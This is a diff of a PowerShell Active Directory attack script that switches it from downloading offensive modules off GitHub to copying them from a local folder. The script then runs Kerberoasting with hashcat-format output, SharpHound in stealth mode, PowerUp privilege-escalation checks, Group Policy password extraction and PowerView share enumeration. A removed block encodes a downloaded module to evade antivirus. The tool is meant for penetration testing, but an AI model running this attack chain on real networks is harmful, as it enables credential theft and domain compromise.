@@ -1,7 +1,9 @@
 Write-Host "###########################################################################################################" -ForegroundColor Green
-Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.2                                    ##" -ForegroundColor Green
+Write-Host "##   Local Active Directory Assessment and Privilege Escalation Script v1.0                              ##" -ForegroundColor Green
 Write-Host "##   Developed By Hausec                                                                                 ##" -ForegroundColor Green
 Write-Host "##                                                                                                       ##" -ForegroundColor Green
+Write-Host "##   This is the LOCAL script, meaning the modules already need to be in the same directory as this      ##" -ForegroundColor Green
+Write-Host "##   script                                                                                              ##" -ForegroundColor Green
 Write-Host "##   Credit for .ps1s goes to Tim Medin, and the people working on Empire, BloodHound, and PowerSploit   ##" -ForegroundColor Green
 Write-Host "##                                                                                                       ##" -ForegroundColor Green
 Write-Host "##   If you see errors, that's normal. Unless your computer bluescreens or something. That's not normal. ##" -ForegroundColor Green
@@ -26,6 +28,8 @@ else
 {
 	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
 }
+#Get location of local modules
+$modules=split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
 #specify modules folder
 $modulepath=$env:psmodulepath.split(';')[0].split(' ')
 Write-Host "Using Module path: $modulepath" -ForegroundColor Green
@@ -38,31 +42,12 @@ If(!(test-path $modulepath/Kerberoast))
 
 #download Kerberoast
 Write-Host "Fetching Kerberoast module..."
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
+Copy-Item "$modules/Invoke-Kerberoast.ps1" -Destination "$modulepath/Kerberoast/Kerberoast.psm1"
 #Run Kerberoast
 Write-Host "Importing module..." 
 Import-Module Kerberoast.psm1
-Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
+Write-Host "Running Kerberoast" -ForegroundColor  Yellow
 Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
-
-#BloodHound Powershell Method -- Use this if .Exe is picked up by AV. 
-<#
-If(!(test-path $modulepath/Sharp))
-{
-      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
-}
-Write-Host "Fetching SharpHound module..." 
-$download = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/1.5/Ingestors/SharpHound.ps1")
-$Encode = [System.Text.Encoding]::Unicode.GetBytes(($download))
-$Base64 = [Convert]::ToBase64String($Encode)
-$Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Base64))
-$Decoded > $modulepath/Sharp/Sharp.psm1
-Write-Host "Importing module..." 
-Import-Module Sharp.psm1
-Write-Host "Running SharpHound" -ForegroundColor  Yellow
-Invoke-BloodHound -CSVFolder $path | Out-Null
-#>
 
 #BloodHound EXE method
 If(!(test-path $modulepath/Sharp))
@@ -70,22 +55,18 @@ If(!(test-path $modulepath/Sharp))
       New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
 }
 Write-Host "Fetching Sharphound.exe..."
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
+Copy-Item "$modules/Sharphound.exe" -Destination "$modulepath/Sharp"
 Write-Host "Running SharpHound" -ForegroundColor  Yellow
-& "$modulepath/Sharp/Sharp.exe" --Stealth --CSVFolder $path
-
+& "$modulepath/Sharp/SharpHound.exe" --Stealth --CSVFolder $path
 #PrivEsc
 If(!(test-path $modulepath/PrivEsc))
 {
       New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
 }
 Write-Host "Fetching PowerUp module..."
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.psm1")
+Copy-Item "$modules/PowerUp.ps1" -Destination "$modulepath/PrivEsc/PrivEsc.psm1"
 Write-Host "Importing module..."
-Import-Module PrivEsc.ps1
+Import-Module PrivEsc.psm1
 Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
 Invoke-AllChecks | Out-File $path\PrivEsc.txt
 
@@ -96,8 +77,7 @@ If(!(test-path $modulepath/GPP))
 }
 #check for GPP passwords
 Write-Host "Fetching GPPP module..." 
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.psm1")
+Copy-Item "$modules/Get-GPPPassword.ps1" -Destination "$modulepath/GPP/GPP.psm1"
 #import module
 Write-Host "Importing module..." 
 Import-Module gpp.psm1
@@ -111,8 +91,7 @@ If(!(test-path $modulepath/PowerView))
       New-Item -ItemType Directory -Force -Path $modulepath/PowerView | Out-Null
 }
 Write-Host "Fetching PowerView module..." 
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PowerView.psm1")
+Copy-Item "$modules/PowerView.ps1" -Destination "$modulepath/PowerView/PowerView.psm1"
 Write-Host "Importing module..."
 Import-Module PowerView.psm1
 Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
